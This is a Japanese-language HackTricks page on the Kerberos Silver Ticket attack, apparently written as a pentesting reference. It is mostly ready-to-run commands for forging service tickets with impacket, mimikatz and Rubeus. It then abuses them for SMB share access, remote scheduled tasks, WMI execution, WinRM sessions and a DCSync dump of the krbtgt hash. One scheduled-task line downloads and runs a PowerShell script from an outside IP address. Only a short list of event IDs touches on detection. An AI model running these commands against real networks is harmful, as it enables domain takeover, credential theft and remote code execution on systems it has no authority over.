# Silver Ticket

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**または**[**telegramグループ**](https://t.me/peass)**に参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**する。

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムバグバウンティプラットフォーム**である**Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大\*\*$100,000\*\*のバウンティを獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

**Silver Ticket**攻撃は、Active Directory（AD）環境でのサービスチケットの悪用を含みます。この方法は、コンピューターアカウントなどの**サービスアカウントのNTLMハッシュを取得**し、チケット発行サービス（TGS）チケットを偽造することに依存しています。この偽造されたチケットを使用すると、攻撃者はネットワーク上の特定のサービスにアクセスし、**通常は管理特権を狙って**任意のユーザーをなりすますことができます。チケットの偽造には、AESキーを使用することがより安全で検出されにくいことが強調されています。

チケットの作成には、オペレーティングシステムに基づいて異なるツールが使用されます：

### Linux上

```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Windows上

```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

## 利用可能なサービス

| サービスタイプ                | サービスシルバーチケット                                                  |
| ---------------------- | ------------------------------------------------------------- |
| WMI                    | <p>HOST</p><p>RPCSS</p>                                       |
| PowerShellリモート         | <p>HOST</p><p>HTTP</p><p>OSによっては:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                  | <p>HOST</p><p>HTTP</p><p>場合によっては: WINRM</p>                   |
| スケジュールタスク              | HOST                                                          |
| Windowsファイル共有、またpsexec | CIFS                                                          |
| LDAP操作、DCSyncを含む       | LDAP                                                          |
| Windowsリモートサーバー管理ツール   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                            |
| ゴールデンチケット              | krbtgt                                                        |

**Rubeus**を使用して、以下のパラメータを使用してこれらのチケットをすべて要求できます:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### シルバーチケットのイベントID

* 4624: アカウントログオン
* 4634: アカウントログオフ
* 4672: 管理者ログオン

## サービスチケットの悪用

以下の例では、チケットが管理者アカウントを偽装して取得されたと想定しています。

### CIFS

このチケットを使用すると、`C$`および`ADMIN$`フォルダに**SMB**経由でアクセスし、リモートファイルシステムの一部にファイルをコピーすることができます。

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

### ホスト

この権限を使用すると、リモートコンピューターでスケジュールされたタスクを生成し、任意のコマンドを実行できます。

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

これらのチケットを使用すると、**被害者システムでWMIを実行**できます。

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

以下のページで**wmiexecに関する詳細情報**を見つける：

{% content-ref url="../lateral-movement/wmicexec.md" %}
[wmicexec.md](../lateral-movement/wmicexec.md)
{% endcontent-ref %}

### ホスト + WSMAN (WINRM)

コンピューター上でwinrmアクセスを使用すると、**アクセス**してPowerShellを取得できます：

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

### LDAP

この権限を使用すると、**DCSync**を使用してDCデータベースをダンプできます。

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**DCSyncについて**は、以下のページで詳細を学ぶ：

## 参考文献

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**バグバウンティのヒント**: **Intigriti**に**サインアップ**して、ハッカーによって作成されたプレミアム**バグバウンティプラットフォーム**に参加しましょう！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)で今すぐ登録して、最大\*\*$100,000\*\*のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を**フォロー**する
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
